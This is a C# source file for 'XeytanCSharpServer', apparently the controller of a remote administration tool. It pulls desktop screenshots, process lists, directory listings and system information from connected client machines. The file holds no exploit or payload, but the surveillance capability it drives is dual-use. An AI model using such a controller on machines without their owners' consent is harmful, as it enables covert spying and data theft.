using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices.ComTypes;
using System.Threading;
using NetLib.Models;
using XeytanCSharpServer.Concurrent;
using XeytanCSharpServer.Models;
using XeytanCSharpServer.Net;
using XeytanCSharpServer.Ui.Console;
using Action = XeytanCSharpServer.Concurrent.Action;
using FileInfo = NetLib.Models.FileInfo;

namespace XeytanCSharpServer
{
    class XeytanApplication
    {
        public NetServerService Server { get; set; }
        public bool Running { get; set; }
        public ConsoleUiMediator UiMediator { get; set; }
        public AppUiDoubleQueueThreadChannel AppUiChannel { get; set; } = new AppUiDoubleQueueThreadChannel();
        public AppNetDoubleQueueThreadChannel AppNetChannel { get; set; } = new AppNetDoubleQueueThreadChannel();

        public void Run()
        {
            Running = true;
            StartNetSubSystem();
            StartUiSubSystem();
        }


        private void StartNetSubSystem()
        {
            Server = new NetServerService(AppNetChannel);
            new Thread(ListenNetEvents).Start();
            Server.StartAsync();
        }

        private void StartUiSubSystem()
        {
            UiMediator = new ConsoleUiMediator(AppUiChannel = AppUiChannel);
            new Thread(ListenUiEvents).Start();
            UiMediator.Run();
        }

        private void ListenNetEvents()
        {
            while (Running)
            {
                AppEvent appEvent = AppNetChannel.TakeFromNet();
                Target target = appEvent.Target;
                Action action = appEvent.Action;
                Subject subject = appEvent.Subject;
                object data = appEvent.Data;

                if (appEvent.GetType() == typeof(ClientAppEvent))
                {
                    Client client = ((ClientAppEvent) appEvent).Client;

                    if (subject == Subject.Desktop)
                    {
                        if (action == Action.Fetched)
                        {
                            string path = Directory.GetCurrentDirectory() +
                                          Path.DirectorySeparatorChar +
                                          client.PcName;


                            if (!Directory.Exists(path))
                                Directory.CreateDirectory(path);

                            File.WriteAllBytes(path + Path.DirectorySeparatorChar + "screenshot.png",
                                (byte[]) data);

                            appEvent.Data = path;
                        }
                    }
                }

                AppUiChannel.SubmitToUi(appEvent);
            }
        }


        private void ListenUiEvents()
        {
            while (Running)
            {
                AppEvent appEvent = AppUiChannel.TakeFromUi();
                Target target = appEvent.Target;
                Action action = appEvent.Action;
                Subject subject = appEvent.Subject;

                AppNetChannel.SubmitToNet(appEvent);
            }
        }

        public Client GetClient(int clientId)
        {
            return Server.GetClientById(clientId);
        }

        public void FetchProcessList(Client client)
        {
            ThreadPool.QueueUserWorkItem((state => { Server.FetchProcessList(client); }));
        }

        public List<Client> GetClients()
        {
            return Server.GetClients();
        }

        public void FetchFileSystemDrives(Client client)
        {
            ThreadPool.QueueUserWorkItem((state => { Server.FetchFileSystemDrives(client); }));
        }

        public void FetchDirEntries(Client client, string basePath)
        {
            ThreadPool.QueueUserWorkItem((state => { Server.FetchDirEntries(client, basePath); }));
        }

        public void FetchSystemInfo(Client client)
        {
            ThreadPool.QueueUserWorkItem((state => { Server.FetchSystemInfo(client); }));
        }


        public void OnPresentationData(Client client)
        {
            UiMediator.ShowClientConnection(client);
        }

        public void OnFileSystemRoots(Client client, List<DiskDriveInfo> drives)
        {
            UiMediator.ShowFsRoots(client, drives);
        }

        public void OnFileSystemDirEntries(Client client, string basePath, List<FileInfo> dirEntries)
        {
            UiMediator.ShowFsDirEntries(client, basePath, dirEntries);
        }

        public void OnProcessListReceived(Client client, List<ProcessInfo> processes)
        {
            UiMediator.ShowProcessList(client, processes);
        }

        public void OnClientSystemInformation(Client client, SystemInfo systemInformation)
        {
            UiMediator.ShowSystemInformation(client, systemInformation);
        }
    }
}